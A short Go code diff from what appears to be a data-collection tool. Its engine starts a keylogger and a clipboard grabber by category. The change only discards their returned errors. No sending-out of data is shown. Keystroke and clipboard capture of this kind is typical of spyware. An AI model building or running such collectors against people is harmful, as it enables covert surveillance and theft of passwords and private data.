@@ -63,13 +63,13 @@ func (e *CollectorEngine) Collect(category string) (*CollectResult, error) {
 		}
 
 	case CategoryKeylog:
-		e.keylog.Start()
+		_ = e.keylog.Start()
 		entries := e.keylog.GetEntries()
 		result.Success = true
 		result.Keylog = entries
 
 	case CategoryClipboard:
-		e.clip.Start()
+		_ = e.clip.Start()
 		content, err := e.clip.GetContent()
 		if err != nil {
 			result.Error = err.Error()
